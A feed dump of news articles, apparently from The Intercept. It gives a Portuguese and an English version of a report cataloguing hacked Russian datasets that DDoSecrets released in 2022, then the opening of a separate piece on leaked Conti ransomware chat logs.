                                        <content:encoded><![CDATA[<p><u>A Rússia</u> é conhecida pelo seu <a href="https://www.wired.com/story/cyberwar-guide/">exército de hackers</a>, mas desde o início da invasão à Ucrânia, dezenas de organizações russas – incluindo agências governamentais, empresas de petróleo e gás, e instituições financeiras – foram hackeadas, com terabytes de dados roubados sendo vazados na internet.</p>
<p>O <a href="https://ddosecrets.com/wiki/Distributed_Denial_of_Secrets">Distributed Denial of Secrets</a>, ou Negação Distribuída de Segredos, um coletivo de transparência conhecido por ter <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/collections/blueleaks/">liberado 270 gigabytes</a> de informações policiais dos EUA em 2020 (em meio aos protestos por justiça racial após o assassinato de George Floyd), tornou-se, na prática, o lar dos conjuntos de dados russos que foram hackeados. Os conjuntos de dados são submetidos ao DDoSecrets principalmente por hackers anônimos, e depois são disponibilizados ao público no site do coletivo e distribuídos <a href="https://ddosecrets.com/wiki/Torrents">usando BitTorrent</a> (eu sou um conselheiro do DDoSecrets).</p>
<p>“A inundação de dados russos significou muitas noites sem dormir, e é realmente algo imenso”, disse ao <b>Intercept</b> Emma Best, co-fundadora do DDoSecrets, através de um aplicativo de mensagens criptografadas. “Eu seus primeiros 10 anos, o WikiLeaks disse ter publicado 10 milhões de documentos. Em menos de dois meses desde que a invasão começou, já publicamos 6 milhões de documentos russos – e a sensação é que foi tudo isso mesmo”.</p>
<!-- BLOCK(newsletter)[0](%7B%22componentName%22%3A%22NEWSLETTER%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%7D) --><div class="shortcode" data-shortcode="newsletter" data-campaign="" data-cta="" data-headline="" data-layout="" data-subhead=""></div><!-- END-BLOCK(newsletter)[0] -->
<p>Depois de receber um conjunto de dados, o DDoSecrets os organiza e compacta; depois, começa a distribuir os dados usando o BitTorrent para consumo público, divulga-os e ajuda jornalistas de diversos veículos a acessar e noticiar sobre eles. O DDoSecrets publicou cerca de 30 conjuntos de dados hackeados da Rússia desde que a invasão da Ucrânia começou no final de fevereiro.</p>
<p>A grande maioria das fontes que forneceram os dados russos hackeados parecem ser indivíduos anônimos, muitos dos quais identificam a si próprios como parte do movimento hacktivista Anonymous. Algumas fontes fornecem endereços de e-mail ou outras informações de contato como parte dos dados liberados, e alguns, como o <a href="https://twitter.com/xxNB65">Network Battalion 65</a>, têm sua própria presença nas redes sociais.</p>

<p>Ainda assim, com tantos conjuntos de dados enviados por hackers anônimos, é impossível ter certeza sobre suas motivações ou se eles são mesmo hacktivistas de verdade. Por exemplo, em 2016 hackers comprometeram a rede do Comitê Nacional do Partido Democrata dos EUA e vazaram para o WikiLeaks uma série de e-mails roubados em uma tentativa de prejudicar a campanha presidencial de Hillary Clinton. Guccifer 2.0, como se identificava o hacker responsável, alegou ser um agente solitário, mas depois foi <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2018/07/18/mueller-indictment-russian-hackers/">exposto</a> como uma invenção do GRU, a agência de inteligência militar da Rússia. Por essa razão, os conjuntos de dados russos recentemente publicados pelo DDoSecrets incluem uma isenção de responsabilidade: “este conjunto de dados foi divulgado nos preparativos, no meio ou no rescaldo de uma guerra cibernética ou guerra híbrida. Portanto, há uma chance maior de malware, motivações posteriores e dados alterados ou implantados, bem como bandeiras falsas/personalidades falsas. Como resultado, encorajamos os leitores, pesquisadores e jornalistas a tomarem mais cuidado que o normal com os dados”.</p>
<h3><b>Ações hackers começaram em fevereiro</b></h3>
<p>Em 26 de fevereiro, dois dias após o início da invasão russa, o DDoSecrets publicou 200 gigabytes de e-mails do <a href="https://ddosecrets.substack.com/p/limited-distribution-tetraedr-222?s=r">Tetraedr</a>, um fabricante de armas de Belarus, enviados pelo hacktivista identificado como Anonymous Liberlad e o Pwn-Bär Hack Team. Belarus é um aliado próximo da Rússia na guerra contra a Ucrânia. Uma mensagem publicada com o conjunto de dados anunciou “#OpCyberBullyPutin”.</p>
<blockquote><p><em>&#8220;Os conteúdos desse vazamento parecem ser legítimos. E-mails das caixas de entrada dos funcionários da fabricante de armas belarussa Tetraedr. Viram imagens de testes de mísseis, esquemas em PDF para sistemas de armas e folhetos detalhados para veículos blindados.&#8221;</em></p>

<p>Em 25 de fevereiro, a famosa gangue russa de ransomware conhecida como Conti manifestou publicamente seu apoio à guerra da Rússia, e dois dias depois, em 27 de fevereiro, um pesquisador de segurança ucraniano que havia hackeado a infraestrutura interna do Conti <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2022/03/14/russia-ukraine-conti-russian-hackers/">vazou dois anos de registros de conversas de texto internas do Conti</a>, juntamente com documentação de treinamento, ferramentas para ações hacker e código-fonte dos hackers criminosos. “Não posso atirar em nada, mas posso lutar com um teclado e um mouse”,  disse o pesquisador anônimo à <a href="https://www.cnn.com/2022/03/30/politics/ukraine-hack-russian-ransomware-gang/index.html">CNN</a> em 30 de março, antes de fugir da Ucrânia em segurança.</p>
<p>No início de março, o DDoSecrets <a href="https://ddosecrets.substack.com/p/release-roskomnadzor-820-gb?s=r">publicou</a> 817 gigabytes de dados hackeados da Roskomnadzor, a agência federal russa responsável por monitorar, controlar e censurar os meios de comunicação de massa do país. Esses dados vieram especificamente da filial regional da agência na República do Bascortostão, uma das subdivisões que compõem a Rússia. O Intercept tornou esse conjunto de dados pesquisável e compartilhou o acesso com jornalistas independentes russos do <a href="https://meduza.io/en">Meduza</a>, que <a href="https://meduza.io/en/feature/2022/04/13/the-hunt-for-antimilitarism">relataram</a> que a Roskomnadzor vinha monitorando a internet para fiscalizar o “antimilitarismo” desde 2020, pelo menos. No início de março, a Roskomnadzor <a href="https://ria-ru.translate.goog/20220304/blokirovka-1776476388.html?_x_tr_sl=ru&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">começou a censurar</a> o acesso ao Meduza dentro da Rússia “devido à disseminação sistemática de falsificações sobre a operação especial na Ucrânia”, disse um porta-voz da agência ao site de notícias russo RIA Novosti.</p>
<p>As invasões hackers continuaram. Em meados de março, o DDoSecrets <a href="https://ddosecrets.substack.com/p/release-transneft-79-gb?s=r">publicou</a> 79 gigabytes de e-mails da Omega Co., braço de pesquisa e desenvolvimento da maior empresa de oleodutos do mundo, a Transneft, que é controlada pelo Estado na Rússia. Na segunda quinzena de março, o hacktivismo contra a Rússia começou a esquentar. O DDoSecrets publicou outros cinco <a href="https://ddosecrets.substack.com/p/cyberwar-updates-thozis-corp-and?s=r">conjuntos de dados</a>:</p>
<ul>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/Thozis_Corp">5,9 gigabytes de e-mails</a> da Thozis Corp., uma firma de investimentos russas de propriedade do <a href="https://www.forbes.com/profile/zakhar-smushkin/?sh=25a26596bd29">bilionário</a> Zakhar Smushkin.</li>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/MashOil">110 gigabytes de e-mails </a>da MashOil, uma empresa russa que desenha e fabrica equipamento para as indústrias de perfuração, mineração e fracking.</li>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/Central_Bank_of_Russia">22,5 gigabytes</a> de dados supostamente pertencentes ao banco central da Rússia. A fonte para esses dados é identificada como <a href="https://twitter.com/Thblckrbbtworld">The Black Rabbit World</a> no Twitter.</li>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/RostProekt">2,5 gigabytes de e-mails</a> do RostProekt, uma empresa de construção russa. A fonte para esses dados é identificada como <a href="https://twitter.com/DepaixPorteur">@DepaixPorteur</a> no Twitter.</li>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/Rosatom">15,3 gigabytes de dados </a>da Rosatom State Nuclear Energy Corp., a empresa estatal russa especializada em energia nuclear responsável por 20% da produção doméstica de eletricidade do país. Também é uma das maiores exportadoras do mundo de produtos de tecnologia nuclear. A fonte para esses dados incluiu um endereço de e-mail hospedado no provedor gratuito de e-mail criptografado ProtonMail.</li>
</ul>
<p>No último dia de março, o coletivo de transparência também publicou <a href="https://ddosecrets.com/wiki/Marathon_Group">51,9 gigabytes de e-mails</a> do Marathon Group, uma empresa de investimentos de propriedade do sancionado oligarca russo Alexander Vinokurov.</p>
<h3><b>Abril é cruel para a Igreja Ortodoxa</b></h3>
<p>No primeiro dia de abril, o DDoSecrets publicou <a href="https://ddosecrets.substack.com/p/limited-distribution-russian-orthodox?s=r">15 gigabytes de e-mails</a> do braço de caridade da Igreja Ortodoxa Russa. Como os e-mails podem incluir informações sensíveis e privadas de indivíduos, o DDoSecrets não está distribuindo esses dados para o público. Ao invés disso, jornalistas e pesquisadores podem contatar o DDoSecrets para solicitar uma cópia deles.</p>
<p>Em 3 de abril, o DDoSecrets publicou <a href="https://ddosecrets.com/wiki/Mosekspertiza">483 gigabytes de e-mails e documentos</a> da Moskspertiza, uma empresa estatal que fornece serviços especializados para a comunidade empresarial na Rússia. Em 4 de abril, a DDoSecrets publicou <a href="https://ddosecrets.substack.com/p/release-vgtrk-7862-gb?s=r">786 gigabytes de documentos e e-mails</a> da All-Russia State Television and Radio Broadcastiong Co., referida com a sigla VGTRK. A VGTRK é a emissora estatal russa, e opera dezenas de estações de televisão e rádio em todo o país, incluindo estações regionais, nacionais e internacionais em vários idiomas. Ex-funcionários da VGTRK disseram à <a href="https://www-colta-ru.translate.goog/articles/society/8163-kak-delayut-tv-propagandu-chetyre-svidetelstva?_x_tr_sl=ru&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">publicação digital Colta.ru</a> que o Kremlin frequentemente ditava como as notícias deveriam ser abordadas. O Network Battalion 65 é a fonte tanto para os dados hackeados do VGTRK quanto para os da Mosekspertiza.</p>

<p>O setor jurídico da Rússia também foi invadido. Em 8 de abril, a DDoSecrets publicou <a href="https://ddosecrets.com/wiki/Capital_Legal_Services">65 gigabytes de e-mails</a> do escritório de advocacia Capital Legal Services. Um hacker identificado como <a href="https://twitter.com/wh1t3sh4d0w0x90">wh1t3sh4d0w</a> enviou os dados ao coletivo de transparência.</p>
<p>Nos dias seguintes, o DDoSecrets publicou <a href="https://ddosecrets.substack.com/p/releases-petrovsky-fort-aerogas-and?s=r">mais três conjuntos de dados</a>:</p>
<ul>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/Petrofort">244 gigabytes de e-mails </a>do Petrovsky Fort, um complexo de escritórios em São Petersburgo.</li>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/Aerogas">154 gigabytes de e-mails</a> da Aerogas, uma empresa de engenharia que trabalha com as indústrias de petróleo e gás.</li>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/Forest">35,7 gigabytes de e-mails</a> de uma empresa madeireira e de fabricação em madeira chamada Forest.</li>
</ul>
<p>Em 11 de abril, a DDoSecrets publicou <a href="https://ddosecrets.substack.com/p/releases-russian-ministry-of-culture?s=r">outros três conjuntos de dados</a>:</p>
<ul>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/Ministry_of_Culture_of_the_Russian_Federation">446 gigabytes de e-mails</a> do Ministério da Cultura da Rússia, responsável pelas políticas estatais em relação à arte, filmes, direitos autorais, patrimônio cultural e, em alguns casos, pela <a href="https://web.archive.org/web/20140602194904/http://www.afp.com/en/news/russia-bans-historically-false-film-stalin-deportations-chechens">censura</a>.</li>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/Blagoveshchensk_City_Administration">150 gigabytes de e-mails</a> do governo municipal de Blagoveshchesk, na mesma região da Rússia de onde o conjunto de dados do Roskomnadzor foi hackeado.</li>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/Tver_Governor%27s_office">116 gigabytes de e-mails</a> do escritório do governador de Tver Oblast, uma região russa a noroeste de Moscou.</li>
</ul>
<p>Na metade de abril, a DDoSecrets publicou vários conjuntos de dados das indústrias de petróleo e gás:</p>
<ul>
<li style="font-weight: 400"><a href="https://ddosecrets.substack.com/p/release-technotec-440-gb?s=r">440 gigabytes de e-mails</a> da Technotec, um grupo de empresas que desenvolve reagentes químicos e fornece serviços para companhias de petróleo e gás.</li>
<li style="font-weight: 400"><a href="https://ddosecrets.substack.com/p/gazprom-linde?s=r">728 gigabytes de e-mails</a> da Gazprom Linde Engineering, uma firma que projeta instalações de processamento de gás e petroquímica e refinarias de petróleo. Essa empresa era uma joint venture entre a empresa estatal russa de gás Gazprom – a maior corporação da Rússia – e a empresa alemã Linde. No final de março, em resposta às sanções econômicas contra a Rússia, a Linde <a href="https://www.upstreamonline.com/production/russia-s-lng-ambitions-put-at-risk-as-linde-exits/2-1-1189126">anunciou</a> que estava suspendendo seus empreendimentos comerciais russos.</li>
<li style="font-weight: 400"><a href="https://ddosecrets.substack.com/p/gazregion?s=r">222 gigabytes de dados </a>da Gazregion, uma empreiteira de construção que se especializa em gasodutos e instalações de gás. Três fontes diferentes – Network Battalion 65, @DepaixPorteur, e outro hacker anônimo – invadiram essa empresa aproximadamente ao mesmo tempo e enviaram os dados ao DDoSecrets, que publicou os três conjuntos de dados sobrepostos para “fornecer uma visão o mais completa possível, e para proporcionar uma oportunidade de comparação e verificação cruzada”.</li>
</ul>
<p>Em 16 de abril, a DDoSecrets publicou mais dois conjuntos de dados:</p>
<ul>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/Dept_of_Education_of_the_Strezhevoy_City_District_Administration">221 gigabytes de e-mails</a> do departamento de educação da cidade russa de Strezhevoy.</li>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/Continent_Express">399 gigabytes de dados</a> da Continental Express, uma agência de viagens russa. Esses dados foram hackeados pelo Network Battalion 65.</li>
</ul>
<p>No final de abril, a DDoSecrets published os seguintes conjuntos de dados:</p>
<ul>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/Neocom_Geoservice">107 gigabytes de e-mails</a> da Neocom Geoservice, uma empresa de engenharia focada em petróleo, gás e perfuração.</li>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/Synesis_Surveillance_System">1,2 gigabytes de dados</a> da empresa belarussa Synesis, que desenvolve sistemas de vigilância.</li>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/GUOV_I_GS_-_General_Dept._of_Troops_and_Civil_Construction">9,5 gigabytes de e-mails</a> do Departamento Geral de Tropas e Construção Civil, uma empresa de construção mantida pelo Ministério de Defesa russo. Esses dados foram hackeados por @DepaixPorteur.</li>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/Tendertech">160 gigabytes de e-mails</a> da Tendertech, uma empresa que processa documentos financeiros e bancários em nome de outras empresas.</li>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/Worldwide_Invest">130 gigabytes de-emails</a> da Worldwide Invest, uma empresa de investimentos russa.</li>
<li style="font-weight: 400"><a href="https://ddosecrets.substack.com/p/sawatzky?s=r">432 gigabytes de e-mails</a> da empresa russa de administração de propriedades Sawatzky. Seus clientes incluem grandes marcas como Google, Microsoft, Samsung, e Johnson &amp; Johnson.</li>
<li style="font-weight: 400"><a href="https://ddosecrets.com/wiki/Accent_Capital">221 gigabytes de e-mails</a> da Accent Capital, uma firma de investimentos em imóveis comerciais.</li>
</ul>
<p>Ainda em 22 de abril, a DDoSecrets publicou <a href="https://ddosecrets.com/wiki/Enerpred">342 gigabytes de e-mails</a> da Enerpred, a maior produtora de ferramentas hidráulicas da Rússia que trabalha com as indústrias de energia, petroquímica, carvão, gás e construção civil.</p>
<h3>Pesquisando os dados hackeados</h3>
<p>Apesar da enorme escala desses vazamentos de dados russos, poucos jornalistas escreveram sobre eles até agora. Desde o início da guerra, a Rússia <a href="https://news.un.org/en/story/2022/03/1113762">reprimiu severamente</a> sua mídia doméstica, introduzindo penas de anos de prisão para jornalistas que usam as palavras erradas quando descrevem a guerra na Ucrânia – como chamá-la de “guerra” ao invés de “operação militar especial”. A Rússia também intensificou seus esforços de censura, <a href="https://www.theguardian.com/world/2022/mar/04/russia-completely-blocks-access-to-facebook-and-twitter">bloqueando Twitter e Facebook</a> e censurando o acesso a sites de notícias internacionais, deixando o público russo em grande parte às escuras quando se trata de opiniões que não são sancionadas pelo Estado.</p>
<p>Uma das barreiras para organizações de notícias de fora da Rússia é a língua: os dados hackeados estão principalmente em russo. Além disso, os conjuntos de dados hackeados sempre vêm com consideráveis desafios técnicos. O Intercept, que foi fundado em parte para noticiar sobre o arquivo de documentos da Agência Nacional de Segurança dos EUA vazados por Edward Snowden, tem usado seus recursos técnicos para construir ferramentas para tornar esses conjuntos de dados russos pesquisáveis, e depois compartilhar essas ferramentas com outros jornalistas. Repórteres de língua russa do Meduza – que é obrigado a operar na Letônia para evitar os avanços do Kremlin – já publicaram uma matéria baseada em um dos conjuntos de dados indexados pelo Intercept.</p>

                                        <content:encoded><![CDATA[<p><u>Russia is known</u> for <a href="https://www.wired.com/story/cyberwar-guide/">its army of hackers</a>, but since the start of its invasion of Ukraine, dozens of Russian organizations — including government agencies, oil and gas companies, and financial institutions — have been hacked, with terabytes of stolen data leaked onto the internet.</p>
<p><a href="https://ddosecrets.com/wiki/Distributed_Denial_of_Secrets">Distributed Denial of Secrets</a>, the transparency collective that&#8217;s best known for its 2020 <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/collections/blueleaks/">release of 270</a><a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/collections/blueleaks/"> gigabytes</a> of U.S. law enforcement data (in the midst of racial justice protests following the murder of George Floyd), has become the de facto home of the hacked datasets from Russia. The datasets are submitted to DDoSecrets mostly by anonymous hackers, and those datasets are then made available to the public on the collective&#8217;s website and distributed <a href="https://ddosecrets.com/wiki/Torrents">using BitTorrent</a>. (I am an adviser to DDoSecrets).</p>
<p>“The flood of Russian data has meant a lot of sleepless nights, and it&#8217;s truly overwhelming,” Emma Best, co-founder of DDoSecrets, told The Intercept via an encrypted messaging app. “In its first 10 years, WikiLeaks claimed to publish 10 million documents. In the less than two months since the invasion began, we&#8217;ve published over 6 million Russian documents — and it absolutely feels like it.”</p>
<!-- BLOCK(newsletter)[0](%7B%22componentName%22%3A%22NEWSLETTER%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%7D) --><div class="shortcode" data-shortcode="newsletter" data-campaign="" data-cta="" data-headline="" data-layout="" data-subhead=""></div><!-- END-BLOCK(newsletter)[0] -->
<p>After receiving a dataset, DDoSecrets organizes and compresses the data; it then starts distributing the data using BitTorrent for public consumption, publicizes it, and helps journalists at a wide range of newsrooms access and report on it. DDoSecrets has published about 30 hacked datasets from Russia since its invasion of Ukraine began in late February.</p>
<p>The vast majority of sources who provided the hacked Russian data appear to be anonymous individuals, many self-identifying as part of the Anonymous hacktivist movement. Some sources provide email addresses or other contact information as part of the dumped data, and some, like <a href="https://twitter.com/xxNB65">Network Battalion 65</a>, have their own social media presence.</p>

<p>Still, with so many datasets submitted by anonymous hackers, it’s impossible to be certain about their motives or if they’re even truly hacktivists. For instance, in 2016 hackers compromised the network of the Democratic National Committee and leaked stolen emails to WikiLeaks in an attempt to hurt Hillary Clinton’s presidential campaign. Guccifer 2.0, the hacker persona responsible, claimed to be a lone actor but was later <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2018/07/18/mueller-indictment-russian-hackers/">revealed</a> to be an invention of the GRU, Russia’s military intelligence agency.</p>

<p>For this reason, the recent Russian datasets published by DDoSecrets include a disclaimer: “This dataset was released in the buildup to, in the midst of, or in the aftermath of a cyberwar or hybrid war. Therefore, there is an increased chance of malware, ulterior motives and altered or implanted data, or false flags/fake personas. As a result, we encourage readers, researchers and journalists to take additional care with the data.”</p>
<h2>Hacks Begin in February</h2>
<p>On February 26, two days after Russia’s invasion started, DDoSecrets published 200 gigabytes of emails from the Belarus weapons manufacturer <a href="https://ddosecrets.substack.com/p/limited-distribution-tetraedr-222?s=r">Tetraedr</a>, submitted by the hacktivist persona Anonymous Liberland and the Pwn-Bär Hack Team. Belarus is a close ally to Russia in its war against Ukraine. A message published with the dataset announced “#OpCyberBullyPutin.”</p>

<p>On February 25, the notorious Russian ransomware gang known as Conti publicly expressed its support for Russia’s war, and two days later, on February 27, an anonymous Ukrainian security researcher who had hacked Conti’s internal infrastructure <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2022/03/14/russia-ukraine-conti-russian-hackers/">leaked two years of Conti chat logs</a>, along with training documentation, hacking tools, and source code from the criminal hackers. “I cannot shoot anything, but I can fight with a keyboard and mouse,” the anonymous researcher <a href="https://www.cnn.com/2022/03/30/politics/ukraine-hack-russian-ransomware-gang/index.html">told CNN</a> on March 30 before he safely slipped out of Ukraine.</p>
<p>In early March, DDoSecrets <a href="https://ddosecrets.substack.com/p/release-roskomnadzor-820-gb?s=r">published</a> 817 gigabytes of hacked data from Roskomnadzor, the Russian federal agency responsible for monitoring, controlling, and censoring Russian mass media. This data specifically came from the regional branch of the agency in the Republic of Bashkortostan. The Intercept made this dataset searchable and shared access with independent Russian journalists from <a href="https://meduza.io/en">Meduza</a> who <a href="https://meduza.io/en/feature/2022/04/13/the-hunt-for-antimilitarism">reported</a> that Roskomnadzor had been monitoring the internet for “antimilitarism” since at least 2020. In early March, Roskomnadzor <a href="https://ria-ru.translate.goog/20220304/blokirovka-1776476388.html?_x_tr_sl=ru&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">began censoring</a> access to Meduza from inside Russia “due to systematic spread of fakes about the special operation in Ukraine,” a spokesperson for the agency told the Russian news site RIA Novosti.</p>
<p>The hacks continued. In mid-March, DDoSecrets <a href="https://ddosecrets.substack.com/p/release-transneft-79-gb?s=r">published</a> 79 gigabytes of emails from the Omega Co., the research and development wing of the world’s largest oil pipeline company, Transneft, which is state-controlled in Russia. In the second half of March, hacktivism against Russia began to heat up. DDoSecrets published an additional <a href="https://ddosecrets.substack.com/p/cyberwar-updates-thozis-corp-and?s=r">five datasets</a>:</p>
<ul>
<li><a href="https://ddosecrets.com/wiki/Thozis_Corp">5.9 gigabytes of emails</a> from Thozis Corp., a Russian investment firm owned by <a href="https://www.forbes.com/profile/zakhar-smushkin/?sh=25a26596bd29">billionaire</a> oligarch Zakhar Smushkin.</li>
<li><a href="https://ddosecrets.com/wiki/MashOil">110 gigabytes of emails</a> from MashOil, a Russian firm that designs and manufactures equipment for the drilling, mining, and fracking industries.</li>
<li><a href="https://ddosecrets.com/wiki/Central_Bank_of_Russia">22.5 gigabytes of data</a> allegedly from the central bank of Russia. The source for this data is the persona <a href="https://twitter.com/Thblckrbbtworld">The Black Rabbit World</a> on Twitter.</li>
<li><a href="https://ddosecrets.com/wiki/RostProekt">2.5 gigabytes of emails</a> from RostProekt, a Russian construction firm. The source for this data is the persona <a href="https://twitter.com/DepaixPorteur">@DepaixPorteur</a> on Twitter.</li>
<li><a href="https://ddosecrets.com/wiki/Rosatom">15.3 gigabytes of data</a> from Rosatom State Nuclear Energy Corp., Russia’s state-run company that specializes in nuclear energy and makes up 20 percent of the country’s domestic electricity production. It’s also one of the world’s largest exporters of nuclear technology products. The source for this data included an email address hosted at the free encrypted email provider ProtonMail.</li>
</ul>
<p>On the last day of March, the transparency collective also published <a href="https://ddosecrets.com/wiki/Marathon_Group">51.9 gigabytes of emails</a> from the Marathon Group, an investment firm owned by sanctioned Russian oligarch Alexander Vinokurov.</p>
<h2>April Is Cruel to Orthodox Church</h2>
<p>On the first day of April, DDoSecrets published <a href="https://ddosecrets.substack.com/p/limited-distribution-russian-orthodox?s=r">15 gigabytes of emails</a> from the charity wing of the Russian Orthodox Church. Because the emails might include sensitive and private information from individuals, DDoSecrets isn’t distributing this data to the public. Instead, journalists and researchers can contact DDoSecrets to request a copy of it.</p>
<p>On April 3, DDoSecrets published <a href="https://ddosecrets.com/wiki/Mosekspertiza">483 gigabytes of emails and documents</a> from Mosekspertiza, a state-owned corporation that provides expert services to the business community in Russia. On April 4, DDoSecrets published <a href="https://ddosecrets.substack.com/p/release-vgtrk-7862-gb?s=r">786 gigabytes of documents and emails</a> from the All-Russia State Television and Radio Broadcasting Co., referred to with the English acronym VGTRK. VGTRK is Russia’s state-owned broadcaster; it operates dozens of television and radio stations across Russia, including regional, national, and international stations in several languages. Former employees of VGTRK <a href="https://www-colta-ru.translate.goog/articles/society/8163-kak-delayut-tv-propagandu-chetyre-svidetelstva?_x_tr_sl=ru&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">told the digital publication Colta.ru</a> that the Kremlin frequently dictated how the news should be covered. Network Battalion 65 is the source for both the VGTRK and Mosekspertiza hacks.</p>

<p>Russia&#8217;s legal sector also got hacked. On April 8, DDoSecrets published <a href="https://ddosecrets.com/wiki/Capital_Legal_Services">65 gigabytes of emails</a> from the law firm Capital Legal Services. The persona <a href="https://twitter.com/wh1t3sh4d0w0x90">wh1t3sh4d0w</a> submitted the data to the transparency collective.</p>
<p>In the following days, DDoSecrets published <a href="https://ddosecrets.substack.com/p/releases-petrovsky-fort-aerogas-and?s=r">three more datasets</a>:</p>
<ul>
<li><a href="https://ddosecrets.com/wiki/Petrofort">244 gigabytes of emails</a> from Petrovsky Fort, an office building complex in St. Petersburg.</li>
<li><a href="https://ddosecrets.com/wiki/Aerogas">154 gigabytes of emails</a> from Aerogas, an engineering company that works in the oil and gas industries.</li>
<li><a href="https://ddosecrets.com/wiki/Forest">35.7 gigabytes of emails</a> from a Russian logging and wood manufacturing company called Forest.</li>
</ul>
<p>By April 11, DDoSecrets had published <a href="https://ddosecrets.substack.com/p/releases-russian-ministry-of-culture?s=r">another three datasets</a>:</p>
<ul>
<li><a href="https://ddosecrets.com/wiki/Ministry_of_Culture_of_the_Russian_Federation">446 gigabytes of emails</a> from the Ministry of Culture of the Russian Federation. This government agency is responsible for state policy regarding art, film, copyright, cultural heritage, and in some cases <a href="https://web.archive.org/web/20140602194904/http://www.afp.com/en/news/russia-bans-historically-false-film-stalin-deportations-chechens">censorship</a>.</li>
<li><a href="https://ddosecrets.com/wiki/Blagoveshchensk_City_Administration">150 gigabytes of emails</a> from the city administration of Blagoveshchensk. This is in the same region of Russia that the Roskomnadzor dataset was hacked from.</li>
<li><a href="https://ddosecrets.com/wiki/Tver_Governor%27s_office">116 gigabytes of emails</a> from the governor’s office of Tver Oblast, a region of Russia northwest of Moscow.</li>
</ul>
<p>In mid-April, DDoSecrets published several datasets from the oil and gas industries:</p>
<ul>
<li><a href="https://ddosecrets.substack.com/p/release-technotec-440-gb?s=r">440 gigabytes of emails</a> from Technotec, a group of companies that develops chemical reagents for and provides services to oil and gas companies.</li>
<li><a href="https://ddosecrets.substack.com/p/gazprom-linde?s=r">728 gigabytes of emails</a> from Gazprom Linde Engineering, a firm that designs gas and petrochemical processing facilities and oil refineries. This company was a joint venture between the state-owned Russian gas company Gazprom — the largest corporation in Russia — and the German company Linde. In late March, in response to economic sanctions against Russia, Linde <a href="https://www.upstreamonline.com/production/russia-s-lng-ambitions-put-at-risk-as-linde-exits/2-1-1189126">announced</a> that it was suspending its Russian business ventures.</li>
<li><a href="https://ddosecrets.substack.com/p/gazregion?s=r">222 gigabytes of data</a> from Gazregion, a construction company that specializes in building gas pipelines and facilities. Three different sources — Network Battalion 65, @DepaixPorteur, and another anonymous hacker — hacked this company at roughly the same time and submitted data to DDoSecrets, which published all three overlapping datasets to “provide as complete a picture as possible, and to provide an opportunity for comparison and cross-checking.”</li>
</ul>
<p>On April 16, DDoSecrets published two more datasets:</p>
<ul>
<li><a href="https://ddosecrets.com/wiki/Dept_of_Education_of_the_Strezhevoy_City_District_Administration">221 gigabytes of emails</a> from the education department of the Russian city of Strezhevoy.</li>

<h2>Researching the Hacked Data</h2>
<p>Despite the massive scale of these Russian data leaks, very few journalists have reported on them so far. Since the war began, Russia has <a href="https://news.un.org/en/story/2022/03/1113762">severely clamped down</a> on its domestic media, introducing penalties of years in prison for journalists who use the wrong words when describing the war in Ukraine — like calling it a “war” instead of a “special military operation.” Russia has also ramped up its censorship efforts, <a href="https://www.theguardian.com/world/2022/mar/04/russia-completely-blocks-access-to-facebook-and-twitter">blocking Twitter and Facebook</a> and censoring access to international news sites, leaving the Russian public largely in the dark when it comes to views that aren’t sanctioned by the state.</p>
<p>One of the barriers for non-Russian news organizations is language: The hacked data is principally in Russian. Additionally, hacked datasets always come with considerable technical challenges. The Intercept, which was founded in part to report on the archive of National Security Agency documents leaked by Edward Snowden, has been using our technical resources to build out tools to make these Russian datasets searchable and then sharing access to these tools with other journalists. Russian-speaking journalists from Meduza — which is forced to operate in Latvia to avoid the Kremlin’s reach — have already published a story based on one of the datasets indexed by The Intercept.</p>

                                        <content:encoded><![CDATA[<p><u>Internal chat logs</u> leaked from the notorious Russian ransomware gang Conti reveal unfiltered conversations between ultranationalist hackers in which they repeat Russian President Vladimir Putin’s conspiratorial lies about Ukraine, discuss the impact of early Western sanctions against their country, and make antisemitic comments about Ukraine’s Jewish president.</p>
<p>The logs were leaked late last month, <a href="https://krebsonsecurity.com/2022/03/conti-ransomware-group-diaries-part-iii-weaponry/">reportedly</a> by a Ukrainian security researcher, after Conti <a href="https://www.reuters.com/technology/russia-based-ransomware-group-conti-issues-warning-kremlin-foes-2022-02-25/">publicly announced</a> its support for Putin’s invasion of Ukraine and threatened to retaliate against any cyber warfare targeted at the Russian-speaking world. The logs span two years and multiple chat services and were released alongside training documentation, hacking tools, and source code.</p>
